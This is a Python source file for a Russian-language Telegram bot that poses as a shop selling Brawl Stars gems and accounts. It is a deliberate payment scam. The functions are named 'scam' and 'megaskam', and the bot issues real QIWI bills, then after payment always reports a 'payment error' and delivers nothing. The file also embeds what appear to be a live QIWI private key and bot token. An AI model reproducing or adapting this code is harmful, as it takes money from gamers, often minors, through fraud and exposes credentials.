import telebot
from telebot import types
from pyqiwip2p import QiwiP2P
from pyqiwip2p.p2p_types import QiwiCustomer, QiwiDatetime, PaymentMethods
import random

QIWI_PRIV_KEY = "eyJ2ZXJzaW9uIjoiUDJQIiwiZGF0YSI6eyJwYXlpbl9tZXJjaGFudF9zaXRlX3VpZCI6InAzbGdpMC0wMCIsInVzZXJfaWQiOiI3OTY2MDg1OTcxOSIsInNlY3JldCI6ImUyZTc0MjQxZjU0ZTFhOWE2N2E1MGM3ZmYzNThlZDA1Y2U5Mjg3YmJhYThmOWQ4ZDVlNmIwMzkxMDg2Yzk5NTAifX0="
token = '5933182905:AAFzUuRQEN0wT_ynNaa2Tpf1h4TR0XYXSQg'
bot = telebot.TeleBot(token)


@bot.message_handler(commands=['start'])
def start(message):
    bot.send_message(message.chat.id, 'Здравствуйте! Это бот для покупки гемов и аккаунтов бравл старс!')
    scam(message)


@bot.message_handler()
def scam(message):
    markup = types.ReplyKeyboardMarkup()
    catalog = types.KeyboardButton('Купить гемы!')
    catalog_add = types.KeyboardButton('Купить аккаунт')
    # random_film = types.KeyboardButton('Выбрать рандомный фильм')
    # delete_film = types.KeyboardButton('Удалиsть фильм')
    # reit_film = types.KeyboardButton('Подборка фильмов')
    markup.add(catalog, catalog_add)
    msg = bot.send_message(message.chat.id, 'Выберите команду', reply_markup= markup)
    bot.register_next_step_handler(msg,choosing)


@bot.message_handler()
def choosing(message):
    if message.text == 'Купить гемы!':
        bot.send_message(message.chat.id, 'Самые дешевые гемы для вас!!!')
        gem(message)
    elif message.text == 'Купить аккаунт':
        bot.send_message(message.chat.id, 'К сожалению все аккаунты раскупили(((')
        scam(message)
    else:
        bot.send_message(message.chat.id, 'Команда не распознана')

def gem(message):
    img = open('calash30-360.jpg', 'rb')
    markup = types.ReplyKeyboardMarkup()
    catalog = types.KeyboardButton('30 гемов')
    catalog_add = types.KeyboardButton('80 гемов')
    random_film = types.KeyboardButton('170 гемов')
    delete_film = types.KeyboardButton('360 гемов')
    markup.add(catalog,catalog_add,random_film,delete_film)
    bot.send_photo(message.chat.id, img, reply_markup=markup)
    msg = bot.send_message(message.chat.id, 'Выберите количество гемов!')
    bot.register_next_step_handler(msg,oplata)


def oplata(message):
    if message.text == '30 гемов':
        p2p = QiwiP2P(auth_key=QIWI_PRIV_KEY)
        new_bill = p2p.bill(bill_id=random.randint, amount=50, lifetime=5)
        bot.send_message(916055881, 'Проходит покупка 30 гемов!')
    elif message.text == '80 гемов':
        p2p = QiwiP2P(auth_key=QIWI_PRIV_KEY)
        new_bill = p2p.bill(bill_id=random.randint, amount=100, lifetime=5)
        bot.send_message(916055881, 'Проходит покупка 80 гемов!')
    elif message.text == '170 гемов':
        p2p = QiwiP2P(auth_key=QIWI_PRIV_KEY)
        new_bill = p2p.bill(bill_id=random.randint, amount=190, lifetime=5)
        bot.send_message(916055881, 'Проходит покупка 170 гемов!')
    elif message.text == '360 гемов':
        p2p = QiwiP2P(auth_key=QIWI_PRIV_KEY)
        new_bill = p2p.bill(bill_id=random.randint, amount=290, lifetime=5)
        bot.send_message(916055881, 'Проходит покупка 290 гемов!')
    msg = bot.send_message(message.chat.id, f'{new_bill.pay_url} - счет для оплаты! После оплаты надо будет скинуть почту для передачи гемов.')
    bot.register_next_step_handler(msg, megaskam)


def megaskam(message):
    bot.send_message(message.chat.id, 'Извините! Ошибка оплаты! Если что то пошло не так, просим сообщить в поддержку   https://t.me/helper_200.')
    scam(message)
bot.infinity_polling()
